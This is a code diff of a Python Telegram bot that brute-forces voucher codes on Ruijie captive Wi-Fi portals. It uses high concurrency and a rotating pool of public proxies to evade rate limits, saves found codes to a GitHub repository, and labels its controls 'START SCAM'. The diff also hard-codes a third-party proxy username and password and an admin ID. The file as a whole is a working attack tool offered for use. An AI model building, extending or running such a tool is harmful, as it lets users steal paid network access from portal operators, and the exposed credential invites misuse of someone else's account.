@@ -1,4 +1,4 @@
-import telebot, asyncio, aiohttp, json, base64, random, re, os, string, time, uuid, gc
+import telebot, asyncio, aiohttp, json, base64, random, re, os, string, time, uuid
 from telebot.async_telebot import AsyncTeleBot
 from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
 from aiohttp import web
@@ -13,69 +13,308 @@ GITHUB_TOKEN = os.environ.get("GITHUB_TOKEN", "")
 REPO_OWNER   = os.environ.get("REPO_OWNER",   "")
 REPO_NAME    = os.environ.get("REPO_NAME",    "")
 
-# Admin Telegram IDs — ဤနေရာတွင် တိုက်ရိုက်ထည့်ပါ
 ADMINS = [
     "1626617395",   # Admin 1 ID
     "",   # Admin 2 ID
 ]
 
-if not all([BOT_TOKEN, GITHUB_TOKEN, REPO_OWNER, REPO_NAME]):
-    raise SystemExit("❌ Railway Variables tab တွင် လိုအပ်သော Env vars များ မပြည့်စုံပါ။")
+_missing = [k for k, v in {
+    "BOT_TOKEN":    BOT_TOKEN,
+    "GITHUB_TOKEN": GITHUB_TOKEN,
+    "REPO_OWNER":   REPO_OWNER,
+    "REPO_NAME":    REPO_NAME,
+}.items() if not v]
+if _missing:
+    raise SystemExit(
+        f"❌ Railway Variables tab တွင် အောက်ပါများ မထည့်ရသေးပါ:\n"
+        + "\n".join(f"   • {k}" for k in _missing)
+    )
 
 def is_admin(user_id):
     return str(user_id) in ADMINS
 
-# ── Dynamic Free Proxy Rotator (Auto-Fetch System) ──
+# ==================== DYNAMIC PROXY ROTATOR SYSTEM ====================
+# GitHub-based Free Proxy APIs (Auto-Updated)
 PROXY_SOURCES = [
-    "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt",
-    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
-    "https://api.proxyscrape.com/v3/free-proxy-list/get?request=displayproxies&proxy_format=ipport&format=text"
+    {
+        "name": "VPSLab-Free-Proxy-List",
+        "urls": [
+            "https://raw.githubusercontent.com/VPSLabCloud/VPSLab-Free-Proxy-List/main/http.txt",
+            "https://raw.githubusercontent.com/VPSLabCloud/VPSLab-Free-Proxy-List/main/https.txt",
+            "https://raw.githubusercontent.com/VPSLabCloud/VPSLab-Free-Proxy-List/main/socks4.txt",
+            "https://raw.githubusercontent.com/VPSLabCloud/VPSLab-Free-Proxy-List/main/socks5.txt",
+        ]
+    },
+    {
+        "name": "komutan234-Proxy-List-Free",
+        "urls": [
+            "https://raw.githubusercontent.com/komutan234/Proxy-List-Free/main/http.txt",
+            "https://raw.githubusercontent.com/komutan234/Proxy-List-Free/main/https.txt",
+            "https://raw.githubusercontent.com/komutan234/Proxy-List-Free/main/socks4.txt",
+            "https://raw.githubusercontent.com/komutan234/Proxy-List-Free/main/socks5.txt",
+        ]
+    },
+    # Additional reliable sources
+    {
+        "name": "TheSpeedX-PROXY-List",
+        "urls": [
+            "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
+            "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks4.txt",
+            "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt",
+        ]
+    },
+    {
+        "name": "monosans-proxy-list",
+        "urls": [
+            "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt",
+            "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/socks4.txt",
+            "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/socks5.txt",
+        ]
+    },
+    {
+        "name": "proxylist-to",
+        "urls": [
+            "https://raw.githubusercontent.com/proxylist-to/proxy-list/main/http.txt",
+            "https://raw.githubusercontent.com/proxylist-to/proxy-list/main/socks4.txt",
+            "https://raw.githubusercontent.com/proxylist-to/proxy-list/main/socks5.txt",
+        ]
+    }
 ]
 
-CACHED_PROXIES = []
-last_proxy_update = 0
+# Fallback proxies (used when APIs are unavailable)
+FALLBACK_PROXIES = [
+    "w9nx03l4kl8vdf0:iwx3ijrwgcyil91@rp.scrapegw.com:6060",  # Your existing proxy
+]
 
-async def fetch_fresh_free_proxies():
-    """အွန်လိုင်းမှ အမြဲတမ်းလတ်ဆတ်ပြီး လိုင်းကောင်းသော free proxies များကို dynamic လှမ်းယူသည်"""
-    global CACHED_PROXIES, last_proxy_update
-    current_time = time.monotonic()
+# Proxy configuration
+PROXY_REFRESH_INTERVAL = 300  # 5 minutes (300 seconds)
+PROXY_HEALTH_CHECK_TIMEOUT = 10  # seconds
+MAX_PROXY_FAILURES = 3  # Remove proxy after this many failures
 
-    # ၅ မိနစ်တစ်ကြိမ်သာ API မှအသစ်ဆွဲမည် (Server load မတက်စေရန်)
-    if CACHED_PROXIES and (current_time - last_proxy_update < 300):
-        return CACHED_PROXIES
+class DynamicProxyRotator:
+    def __init__(self):
+        self.proxies = []
+        self.working_proxies = []
+        self.proxy_failures = {}
+        self.last_refresh = 0
+        self.lock = asyncio.Lock()
+        self.current_index = 0
+        self.session = None
+        
+    async def initialize(self):
+        """Initialize the proxy rotator"""
+        self.session = aiohttp.ClientSession(
+            timeout=aiohttp.ClientTimeout(total=30)
+        )
+        await self.refresh_proxies()
+        
+    async def refresh_proxies(self):
+        """Fetch fresh proxies from all sources"""
+        async with self.lock:
+            print("[ProxyRotator] Refreshing proxy list...")
+            all_proxies = []
+            
+            # Fetch from GitHub sources
+            for source in PROXY_SOURCES:
+                for url in source["urls"]:
+                    try:
+                        async with self.session.get(url, timeout=aiohttp.ClientTimeout(total=15)) as resp:
+                            if resp.status == 200:
+                                text = await resp.text()
+                                lines = text.strip().split('\n')
+                                for line in lines:
+                                    line = line.strip()
+                                    if line and ':' in line:
+                                        # Validate proxy format
+                                        if self._is_valid_proxy(line):
+                                            all_proxies.append({
+                                                'proxy': line,
+                                                'source': source['name'],
+                                                'type': self._get_proxy_type(url)
+                                            })
+                    except Exception as e:
+                        print(f"[ProxyRotator] Error fetching from {source['name']}: {e}")
+                        
+            # Add fallback proxies
+            for proxy in FALLBACK_PROXIES:
+                all_proxies.append({
+                    'proxy': proxy,
+                    'source': 'fallback',
+                    'type': 'http'
+                })
+                
+            # Remove duplicates
+            seen = set()
+            unique_proxies = []
+            for p in all_proxies:
+                if p['proxy'] not in seen:
+                    seen.add(p['proxy'])
+                    unique_proxies.append(p)
+                    
+            self.proxies = unique_proxies
+            self.last_refresh = time.time()
+            print(f"[ProxyRotator] Loaded {len(self.proxies)} unique proxies")
+            
+            # Reset failures for new proxies
+            self.proxy_failures = {p['proxy']: 0 for p in self.proxies}
+            
+    def _is_valid_proxy(self, proxy):
+        """Validate proxy format"""
+        try:
+            # Check if it has IP:PORT format or USER:PASS@IP:PORT
+            if '@' in proxy:
+                auth, addr = proxy.split('@', 1)
+                if ':' not in auth:
+                    return False
+            else:
+                addr = proxy
+                
+            host, port = addr.rsplit(':', 1)
+            port = int(port)
+            return 1 <= port <= 65535
+        except:
+            return False
+            
+    def _get_proxy_type(self, url):
+        """Determine proxy type from URL"""
+        if 'socks5' in url:
+            return 'socks5'
+        elif 'socks4' in url:
+            return 'socks4'
+        elif 'https' in url:
+            return 'https'
+        else:
+            return 'http'
+            
+    async def health_check_proxy(self, proxy_info):
+        """Check if a proxy is working"""
+        proxy = proxy_info['proxy']
+        proxy_type = proxy_info['type']
+        
+        # Construct proxy URL
+        if proxy_type == 'socks5':
+            proxy_url = f"socks5://{proxy}"
+        elif proxy_type == 'socks4':
+            proxy_url = f"socks4://{proxy}"
+        elif proxy_type == 'https':
+            proxy_url = f"https://{proxy}"
+        else:
+            proxy_url = f"http://{proxy}"
+            
+        try:
+            async with aiohttp.ClientSession() as session:
+                async with session.get(
+                    'http://httpbin.org/ip',
+                    proxy=proxy_url,
+                    timeout=aiohttp.ClientTimeout(total=PROXY_HEALTH_CHECK_TIMEOUT)
+                ) as resp:
+                    return resp.status == 200
+        except:
+            return False
+            
+    async def get_working_proxy(self):
+        """Get a working proxy with rotation"""
+        async with self.lock:
+            # Refresh if needed
+            if time.time() - self.last_refresh > PROXY_REFRESH_INTERVAL:
+                await self.refresh_proxies()
+                
+            # Try to find a working proxy
+            attempts = 0
+            max_attempts = min(50, len(self.proxies))
+            
+            while attempts < max_attempts and self.proxies:
+                # Get next proxy in rotation
+                proxy_info = self.proxies[self.current_index % len(self.proxies)]
+                self.current_index += 1
+                attempts += 1
+                
+                proxy = proxy_info['proxy']
+                
+                # Skip if too many failures
+                if self.proxy_failures.get(proxy, 0) >= MAX_PROXY_FAILURES:
+                    continue
+                    
+                # Health check
+                if await self.health_check_proxy(proxy_info):
+                    return proxy_info
+                else:
+                    # Mark as failed
+                    self.proxy_failures[proxy] = self.proxy_failures.get(proxy, 0) + 1
+                    
+            # If no working proxy found, use fallback
+            if FALLBACK_PROXIES:
+                return {
+                    'proxy': FALLBACK_PROXIES[0],
+                    'source': 'fallback',
+                    'type': 'http'
+                }
+                
+            return None
+            
+    async def get_proxy_url(self):
+        """Get proxy URL for aiohttp"""
+        proxy_info = await self.get_working_proxy()
+        if not proxy_info:
+            return None
+            
+        proxy = proxy_info['proxy']
+        proxy_type = proxy_info['type']
+        
+        if proxy_type == 'socks5':
+            return f"socks5://{proxy}"
+        elif proxy_type == 'socks4':
+            return f"socks4://{proxy}"
+        elif proxy_type == 'https':
+            return f"https://{proxy}"
+        else:
+            return f"http://{proxy}"
+            
+    async def report_proxy_failure(self, proxy_url):
+        """Report a proxy failure"""
+        if not proxy_url:
+            return
+            
+        # Extract proxy from URL
+        proxy = proxy_url.replace('http://', '').replace('https://', '').replace('socks5://', '').replace('socks4://', '')
+        
+        async with self.lock:
+            if proxy in self.proxy_failures:
+                self.proxy_failures[proxy] += 1
+                print(f"[ProxyRotator] Proxy {proxy} failed ({self.proxy_failures[proxy]} failures)")
+                
+    async def close(self):
+        """Close the session"""
+        if self.session:
+            await self.session.close()
 
-    print("🔄 Fetching fresh free proxies from verified GitHub sources...")
-    verified_proxies = []
+# Global proxy rotator instance
+proxy_rotator = DynamicProxyRotator()
 
-    async with aiohttp.ClientSession() as fetch_sess:
-        for url in PROXY_SOURCES:
-            try:
-                async with fetch_sess.get(url, timeout=10) as resp:
-                    if resp.status == 200:
-                        text = await resp.text()
-                        # IP:PORT ပုံစံများကို ရှာဖွေစစ်ထုတ်သည်
-                        lines = re.findall(r'\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}:\d{1,5}\b', text)
-                        verified_proxies.extend(lines)
-            except Exception as e:
-                print(f"⚠️ Proxy source error ({url}): {e}")
-                continue
+# Legacy function for backward compatibility
+def get_next_proxy():
+    """Legacy function - now uses dynamic rotator"""
+    # This is a synchronous function, so we can't use async here
+    # Instead, we'll use the proxy from the last refresh
+    if proxy_rotator.proxies:
+        proxy_info = proxy_rotator.proxies[proxy_rotator.current_index % len(proxy_rotator.proxies)]
+        proxy_rotator.current_index += 1
+        proxy = proxy_info['proxy']
+        proxy_type = proxy_info['type']
+        
+        if proxy_type == 'socks5':
+            return f"socks5://{proxy}"
+        elif proxy_type == 'socks4':
+            return f"socks4://{proxy}"
+        elif proxy_type == 'https':
+            return f"https://{proxy}"
+        else:
+            return f"http://{proxy}"
+    elif FALLBACK_PROXIES:
+        return f"http://{FALLBACK_PROXIES[0]}"
+    return None
 
-    if verified_proxies:
-        CACHED_PROXIES = list(set(verified_proxies)) # ပုံစံတူများကို ဖယ်ထုတ်သည်
-        last_proxy_update = current_time
-        print(f"✅ Successfully loaded {len(CACHED_PROXIES)} live free proxies.")
-    return CACHED_PROXIES
-
-_proxy_index = 0
-def get_next_proxy_url():
-    """လတ်တလော Proxy စာရင်းထဲမှ ပတ်လည်စနစ် (Round-robin) ဖြင့် တစ်ခုချင်းထုတ်ပေးသည်"""
-    global _proxy_index, CACHED_PROXIES
-    if not CACHED_PROXIES:
-        return None
-    proxy = CACHED_PROXIES[_proxy_index % len(CACHED_PROXIES)]
-    _proxy_index += 1
-    return f"http://{proxy}"
-
+# ==================== REST OF YOUR BOT CODE ====================
 SUCCESS_CODE = asyncio.Queue()
 bot = AsyncTeleBot(BOT_TOKEN)
 user_data        = {}
@@ -87,18 +326,9 @@ limited_texts    = {}
 captcha_state    = {}
 session          = None
 _connector       = None
+CONCURRENCY      = 1000
+_voucher_sem     = None
 _start_time      = time.monotonic()
-
-# ── Speed tuning (2vCPU & 1GB RAM အတွက် အကောင်းဆုံး ချိန်ညှိထားသည်) ──
-VOUCHER_CONCURRENCY = 250    # voucher POST တပြိုင်နက် (1GB RAM အတွက် လုံလောက်သည်)
-CAPTCHA_POOL_SIZE   = 80     # pre-solved captcha အရေအတွက်
-CAPTCHA_SOLVERS     = 15     # captcha တပြိုင်နက် solve လုပ်သောလုပ်သား (CPU မတက်စေရန်)
-BATCH_SIZE          = 250    # တကြိမ်စစ်သော code အရေအတွက်
-
-_captcha_pool  = None   # asyncio.Queue — pre-solved (session_id, auth_code) pairs
-_filler_task   = None   # background task
-_voucher_sem   = None   # initialized in run_bruteforce
-_captcha_sem   = None   # initialized in run_bruteforce
 
 MAX_CONCURRENT_SCANS = 20
 active_scans_count   = 0
@@ -108,7 +338,7 @@ active_scans_lock    = asyncio.Lock()
 # Web server (keep-alive / Railway PORT)
 # ───────────────────────────────────────────────────────────
 async def handle(request):
-    return web.Response(text="Bot is awake and running 24/7 with Live Proxies!")
+    return web.Response(text="Bot is awake and running 24/7!")
 
 async def web_server():
     app    = web.Application()
@@ -285,7 +515,7 @@ Portal URL အသစ်ထည့်ပါက ယခင် URL ပျက်သွ
             await bot.answer_callback_query(call.id)
             return
 
-        mode = user_data[chat_id]['selected_mode']
+        mode        = user_data[chat_id]['selected_mode']
         start_digit = user_data[chat_id].get('start_digit')
 
         if 'session_url' not in user_data.get(chat_id, {}):
@@ -311,17 +541,18 @@ Portal URL အသစ်ထည့်ပါက ယခင် URL ပျက်သွ
             text=f"🔍 Scan စတင်နေပါသည်...\n\n🔢 VOUCHER Mode: {mode}\n\nSTOP SCAM ခလုတ်ဖြင့် ရပ်တန့်နိုင်ပါသည်။",
             reply_markup=get_scam_button_keyboard(), parse_mode="Markdown"
         )
+
         progress_msg = await bot.send_message(chat_id, "🔍 Scanning VOUCHER Codes...\n\n")
-        scan_id = str(uuid.uuid4())
+        scan_id      = str(uuid.uuid4())
 
         # Notify admins (scan start)
         try:
             portal_url = user_data[chat_id].get('session_url', 'Unknown')
-            last_url = user_data[chat_id].get('last_admin_notified_url', '')
+            last_url   = user_data[chat_id].get('last_admin_notified_url', '')
             if portal_url != last_url and portal_url != 'Unknown':
-                msg = (f"🚀 Scan Start\n\n👤 User: {user_name}\n"
-                       f"🆔 ID: {user_id}\n🔢 Mode: {mode}\n"
-                       f"🔗 Portal:\n{portal_url}")
+                msg = (f"🚀 **Scan Start**\n\n👤 **User:** {user_name}\n"
+                       f"🆔 **ID:** `{user_id}`\n🔢 **Mode:** {mode}\n"
+                       f"🔗 **Portal:**\n`{portal_url}`")
                 for admin_id in ADMINS:
                     try:
                         await bot.send_message(admin_id, msg, parse_mode="Markdown")
@@ -330,9 +561,6 @@ Portal URL အသစ်ထည့်ပါက ယခင် URL ပျက်သွ
                 user_data[chat_id]['last_admin_notified_url'] = portal_url
         except Exception as e:
             print(f"Admin notify error: {e}")
-
-        # Scan မစခင် free proxies တွေကို update အရင်လုပ်သည်
-        await fetch_fresh_free_proxies()
 
         task = asyncio.create_task(
             run_bruteforce(
@@ -350,7 +578,7 @@ Portal URL အသစ်ထည့်ပါက ယခင် URL ပျက်သွ
         results, _ = await get_file_content("result.json")
         if user_id in results and results[user_id]:
             codes = "\n".join(results[user_id])
-            text = f"✅ Found Codes:\n{codes}"
+            text  = f"✅ Found Codes:\n{codes}"
         else:
             text = "📋 ယခင်ကရရှိထားသော success code မရှိသေးပါ။"
         await bot.edit_message_text(
@@ -388,8 +616,10 @@ Portal URL အသစ်ထည့်ပါက ယခင် URL ပျက်သွ
     # ── Select voucher mode ───────────────────────────────
     if call.data.startswith("scan_"):
         mode = call.data.replace("scan_", "")
+
         if chat_id not in user_data:
             user_data[chat_id] = {}
+
         if 'session_url' not in user_data[chat_id]:
             await bot.edit_message_text(
                 chat_id=chat_id, message_id=call.message.message_id,
@@ -398,6 +628,7 @@ Portal URL အသစ်ထည့်ပါက ယခင် URL ပျက်သွ
             )
             await bot.answer_callback_query(call.id)
             return
+
         if mode in ["6", "7", "8", "9"]:
             await bot.edit_message_text(
                 chat_id=chat_id, message_id=call.message.message_id,
@@ -406,8 +637,10 @@ Portal URL အသစ်ထည့်ပါက ယခင် URL ပျက်သွ
             )
             await bot.answer_callback_query(call.id)
             return
-        user_data[chat_id]['selected_mode'] = mode
-        user_data[chat_id]['start_digit'] = None
+
+        user_data[chat_id]['selected_mode']  = mode
+        user_data[chat_id]['start_digit']    = None
+
         await bot.edit_message_text(
             chat_id=chat_id, message_id=call.message.message_id,
             text=f"🔍 ရွေးချယ်ထားသော VOUCHER: {mode}\n\n✅ START SCAM ခလုတ်ကိုနှိပ်ပြီး စတင်ပါ။",
@@ -419,14 +652,18 @@ Portal URL အသစ်ထည့်ပါက ယခင် URL ပျက်သွ
     # ── Select start digit ────────────────────────────────
     if call.data.startswith("digit_"):
         parts = call.data.split("_")
-        mode = parts[1]
+        mode  = parts[1]
         digit = parts[2]
+
         if chat_id not in user_data:
             user_data[chat_id] = {}
+
         user_data[chat_id]['selected_mode'] = mode
-        user_data[chat_id]['start_digit'] = None if digit == "random" else digit
+        user_data[chat_id]['start_digit']   = None if digit == "random" else digit
+
         txt = f"🔍 VOUCHER Mode: {mode}\n"
         txt += "🔢 ထိပ်စီးနံပါတ်: Random" if digit == "random" else f"🔢 ထိပ်စီးနံပါတ်: {digit} မှစ၍ရှာမည်"
+
         await bot.edit_message_text(
             chat_id=chat_id, message_id=call.message.message_id,
             text=txt + "\n\n✅ START SCAM ခလုတ်ကိုနှိပ်ပြီး စတင်ပါ။",
@@ -441,7 +678,7 @@ Portal URL အသစ်ထည့်ပါက ယခင် URL ပျက်သွ
 @bot.message_handler(commands=['result'])
 async def handle_result(message):
     results, _ = await get_file_content("result.json")
-    uid = str(message.chat.id)
+    uid         = str(message.chat.id)
     if uid in results and results[uid]:
         codes = "\n".join(results[uid])
         await bot.reply_to(message, f"✅ Found Codes:\n{codes}")
@@ -454,18 +691,22 @@ async def handle_result(message):
 @bot.message_handler(commands=['recheck'])
 async def recheck(message):
     chat_id = message.chat.id
+
     results, sha = await get_file_content("result.json")
-    uid = str(chat_id)
+    uid          = str(chat_id)
+
     if uid not in results or not results[uid]:
         await bot.reply_to(message, "ယခင် success code တစ်ခုမျှမရှိသေးပါ။")
         return
+
     if 'session_url' not in user_data.get(chat_id, {}):
         await bot.reply_to(message, "Scan လုပ်ရန် Portal URL ကိုအရင်ထည့်သွင်းပေးပါ။")
         return
+
     await bot.reply_to(message, "Success Code များအား ပြန်လည်စစ်ဆေးနေပါသည်။")
-    await fetch_fresh_free_proxies()
-    recheck_list = []
-    session_url_rc = user_data[chat_id]["session_url"]
+
+    recheck_list    = []
+    session_url_rc  = user_data[chat_id]["session_url"]
     for code in results[uid]:
         recode = await perform_check(
             session_url_rc, code, chat_id,
@@ -473,6 +714,7 @@ async def recheck(message):
         )
         if recode:
             recheck_list.append(recode)
+
     to_show = "\n".join(recheck_list) if recheck_list else "မည်သည့် success code မျှမကျန်ပါ။"
     await bot.reply_to(message, f"✅ Rechecked Codes:\n\n{to_show}")
     await save_rechecked_codes(uid, recheck_list, sha)
@@ -483,7 +725,7 @@ async def save_rechecked_codes(uid, recheck_list, sha):
     await update_file_content("result.json", results, sha, f"Recheck update for {uid}")
 
 # ───────────────────────────────────────────────────────────
-# /portal  (FIXED: no proxy for URL validation)
+# /portal
 # ───────────────────────────────────────────────────────────
 @bot.message_handler(commands=['portal'])
 async def handle_portal(message):
@@ -492,16 +734,18 @@ async def handle_portal(message):
         await bot.reply_to(
             message,
             "🔗 Portal URL ထည့်သွင်းရန်:\n\n/portal [your_portal_url]\n\n"
-            "ဥပမာ:\n/portal https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html?lang=en_US&mac=02:00:00:00:00:00"
+            "ဥပမာ:\n/portal https://portal-as.ruijienetworks.com/download/static/"
+            "maccauth/src/index.html?lang=en_US&mac=02:00:00:00:00:00"
         )
         return
-    url = args[1].strip()
+
+    url = args[1]
     if message.chat.id not in user_data:
         user_data[message.chat.id] = {}
+
     await bot.reply_to(message, "🔗 Portal URL စစ်ဆေးနေပါသည်...")
 
-    # FIXED: Validate URL directly without proxy (avoids false rejections)
-    if await check_session_url_improved(session_url=url, use_proxy=False):
+    if await check_session_url_improved(session_url=url):
         user_data[message.chat.id]['session_url'] = url
         await bot.reply_to(
             message,
@@ -513,17 +757,21 @@ async def handle_portal(message):
             message,
             "❌ Portal URL မှားယွင်းနေပါသည်။ ပြန်လည်စစ်ဆေးပါ။\n\n"
             "✅ မှန်ကန်တဲ့ URL ပုံစံ:\n"
-            "https://portal-as.ruijienetworks.com/download/static/maccauth/src/index.html?lang=en_US&mac=02:00:00:00:00:00",
+            "`https://portal-as.ruijienetworks.com/download/static/maccauth/"
+            "src/index.html?lang=en_US&mac=02:00:00:00:00:00`",
             parse_mode="Markdown"
         )
 
 async def check_session_url_improved(session_url, use_proxy=False):
     headers = {
-        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+        'accept':          'text/html,application/xhtml+xml,*/*;q=0.8',
         'accept-language': 'en-US,en;q=0.9',
-        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+        'user-agent':      'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
     }
-    proxy = get_next_proxy_url() if use_proxy else None
+    proxy = None
+    if use_proxy:
+        proxy = await proxy_rotator.get_proxy_url()
+        
     try:
         async with session.get(
             session_url, allow_redirects=True, headers=headers,
@@ -531,13 +779,21 @@ async def check_session_url_improved(session_url, use_proxy=False):
         ) as response:
             if response.status >= 400:
                 return False
-            final_url = str(response.url)
+            final_url     = str(response.url)
             response_text = await response.text()
             if "sessionId" in final_url or "sessionId" in response_text:
                 return True
-            for indicator in ["ruijienetworks.com", "maccauth", "sessionId", "lang=en_US"]:
+            for indicator in ["portal-as.ruijienetworks.com", "maccauth", "sessionId", "lang=en_US"]:
                 if indicator in final_url or indicator in response_text:
                     return True
+            for pattern in [
+                r'sessionId["\']?\s*[:=]\s*["\']?([a-zA-Z0-9]+)',
+                r'[?&]sessionId=([a-zA-Z0-9]+)',
+            ]:
+                if re.search(pattern, response_text, re.IGNORECASE):
+                    return True
+            if "portal" in response_text.lower() or "captcha" in response_text.lower():
+                return True
             return False
     except asyncio.TimeoutError:
         return False
@@ -546,13 +802,14 @@ async def check_session_url_improved(session_url, use_proxy=False):
         return False
 
 # ───────────────────────────────────────────────────────────
-# /scan (command-based entry)
+# /scan  (command-based entry)
 # ───────────────────────────────────────────────────────────
 @bot.message_handler(commands=['scan'])
 async def handle_key_scan(message):
-    args = message.text.split(maxsplit=1)
+    args    = message.text.split(maxsplit=1)
     chat_id = message.chat.id
     user_id = str(chat_id)
+
     if len(args) < 2:
         await bot.reply_to(
             message,
@@ -561,16 +818,36 @@ async def handle_key_scan(message):
             reply_markup=get_voucher_keyboard()
         )
         return
+
     mode = args[1]
     if chat_id not in user_data or 'session_url' not in user_data[chat_id]:
         await bot.reply_to(message, "Scan လုပ်ရန် Portal URL ကိုအရင်ထည့်သွင်းပေးပါ။")
         return
+
     if chat_id in scan_tasks and not scan_tasks[chat_id]["task"].done():
         await bot.reply_to(message, "Scan သည် အလုပ်လုပ်နေပြီဖြစ်သည်။ STOP SCAM ခလုတ်ဖြင့် ရပ်တန့်နိုင်ပါသည်။")
         return
+
     progress_msg = await bot.send_message(chat_id, "🔍 Scanning VOUCHER Codes...\n\n")
-    scan_id = str(uuid.uuid4())
-    await fetch_fresh_free_proxies()
+    scan_id      = str(uuid.uuid4())
+
+    try:
+        user_name  = message.from_user.first_name or message.from_user.username or "User"
+        portal_url = user_data[chat_id].get('session_url', 'Unknown')
+        last_url   = user_data[chat_id].get('last_admin_notified_url', '')
+        if portal_url != last_url and portal_url != 'Unknown':
+            msg = (f"🚀 **Scan (/scan)**\n👤 **User:** {user_name}\n"
+                   f"🆔 **ID:** `{user_id}`\n🔢 **Mode:** {mode}\n"
+                   f"🔗 **Portal:**\n`{portal_url}`")
+            for admin_id in ADMINS:
+                try:
+                    await bot.send_message(admin_id, msg, parse_mode="Markdown")
+                except Exception:
+                    pass
+            user_data[chat_id]['last_admin_notified_url'] = portal_url
+    except Exception as e:
+        print(f"Admin notify error in /scan: {e}")
+
     task = asyncio.create_task(
         run_bruteforce(mode, chat_id, user_data[chat_id]['session_url'],
                        scan_id, message=message, progress_msg=progress_msg)
@@ -578,24 +855,32 @@ async def handle_key_scan(message):
     scan_tasks[chat_id] = {"task": task, "stop": False, "scan_id": scan_id}
 
 # ───────────────────────────────────────────────────────────
-# /status (admin only)
+# /status  (admin only)
 # ───────────────────────────────────────────────────────────
 @bot.message_handler(commands=['status'])
 async def status(message):
     if not is_admin(message.chat.id):
         await bot.reply_to(message, "No Permission")
         return
-    active_scans = sum(1 for d in scan_tasks.values() if not d["task"].done())
+    active_scans   = sum(1 for d in scan_tasks.values() if not d["task"].done())
     uptime_seconds = int(time.monotonic() - _start_time)
-    hours, rem = divmod(uptime_seconds, 3600)
-    minutes, secs = divmod(rem, 60)
+    hours, rem     = divmod(uptime_seconds, 3600)
+    minutes, secs  = divmod(rem, 60)
+    
+    # Proxy status
+    proxy_count = len(proxy_rotator.proxies)
+    working_count = len([p for p, f in proxy_rotator.proxy_failures.items() if f < MAX_PROXY_FAILURES])
+    
     await bot.reply_to(
         message,
         f"📊 Bot Status\n\n"
         f"⏱ Uptime: {hours}h {minutes}m {secs}s\n"
         f"🔍 Active Scans: {active_scans}\n"
-        f"🌐 Total Live Proxies: {len(CACHED_PROXIES)}\n"
-        f"👥 Sessions: {len(user_data)}"
+        f"👥 Sessions: {len(user_data)}\n\n"
+        f"🌐 Proxy Status:\n"
+        f"• Total Proxies: {proxy_count}\n"
+        f"• Working: {working_count}\n"
+        f"• Failed: {proxy_count - working_count}"
     )
 
 # ───────────────────────────────────────────────────────────
@@ -606,7 +891,7 @@ async def send_success_file(chat_id):
     if str(chat_id) in target_ids and chat_id in success_texts and success_texts[chat_id]:
         try:
             filename = f"success_{chat_id}_{int(time.time())}.txt"
-            content = "\n".join(success_texts[chat_id])
+            content  = "\n".join(success_texts[chat_id])
             with open(filename, "w", encoding="utf-8") as f:
                 f.write(content)
             with open(filename, "rb") as f:
@@ -622,10 +907,10 @@ async def send_success_file(chat_id):
 @bot.message_handler(commands=['stop'])
 async def stop_scan_command(message):
     chat_id = message.chat.id
-    data = scan_tasks.get(chat_id)
+    data    = scan_tasks.get(chat_id)
     if data and not data["task"].done():
-        data["stop"] = True
-        data["scan_id"] = None
+        data["stop"]     = True
+        data["scan_id"]  = None
         await send_success_file(chat_id)
         data["task"].cancel()
         success_messages.pop(chat_id, None)
@@ -649,7 +934,7 @@ async def github_update_scheduler():
             try:
                 results, sha = await get_file_content("result.json")
                 for item in items:
-                    uid = str(item["chat_id"])
+                    uid  = str(item["chat_id"])
                     code = item["code"]
                     if uid not in results:
                         results[uid] = []
@@ -679,7 +964,7 @@ def iter_codes(mode, start_digit=None):
         length = int(mode)
         if start_digit is not None:
             start = int(start_digit) * (10 ** (length - 1))
-            end = (int(start_digit) + 1) * (10 ** (length - 1))
+            end   = (int(start_digit) + 1) * (10 ** (length - 1))
             for i in range(start, end):
                 yield str(i).zfill(length)
             return
@@ -719,9 +1004,9 @@ def format_progress(checked, total=None, speed=0, found=0):
     speed_str = f"{speed:,.0f} codes/min"
     if total is not None:
         bar_length = 20
-        percent = (checked / total) * 100
-        filled = min(bar_length, int(percent / 5))
-        bar = "█" * filled + "░" * (bar_length - filled)
+        percent    = (checked / total) * 100
+        filled     = min(bar_length, int(percent / 5))
+        bar        = "█" * filled + "░" * (bar_length - filled)
         return (
             f"🔍Scanning VOUCHER Codes...\n\n"
             f"📦Checked : {checked:,}/{total:,}\n"
@@ -738,12 +1023,13 @@ def format_progress(checked, total=None, speed=0, found=0):
         f"📊Status : running\n"
     )
 
+BATCH_SIZE = 1000
+
 # ───────────────────────────────────────────────────────────
 # Brute-force runner
 # ───────────────────────────────────────────────────────────
 async def run_bruteforce(mode, chat_id, session_url, scan_id,
                          message=None, progress_msg=None, start_digit=None):
-    global _captcha_pool, _filler_task, _voucher_sem
     try:
         code_iter = iter_codes(mode, start_digit=start_digit)
     except ValueError as e:
@@ -752,28 +1038,12 @@ async def run_bruteforce(mode, chat_id, session_url, scan_id,
 
     total = (10 ** int(mode)) if mode in ["6", "7", "8"] else None
 
-    # ── Start captcha pool ───────────────────────────────
-    _captcha_pool = asyncio.Queue(maxsize=CAPTCHA_POOL_SIZE)
-    _filler_task = asyncio.create_task(
-        _fill_captcha_pool(_captcha_pool, session_url, scan_id, chat_id)
-    )
-
-    # Wait for pool to warm up (min 30 pre-solved captchas)
-    warm_msg = await bot.send_message(
-        chat_id, "⚡ Captcha Pool ပြင်ဆင်နေသည်... (3-5s)"
-    )
-    for _ in range(60):
-        if _captcha_pool.qsize() >= 30:
-            break
-        await asyncio.sleep(0.1)
-    try:
-        await bot.delete_message(chat_id, warm_msg.message_id)
-    except Exception:
-        pass
-
-    _voucher_sem = asyncio.Semaphore(VOUCHER_CONCURRENCY)
-    checked = 0
+    checked    = 0
     scan_start = time.monotonic()
+
+    global _voucher_sem
+    if _voucher_sem is None:
+        _voucher_sem = asyncio.Semaphore(CONCURRENCY)
 
     try:
         while True:
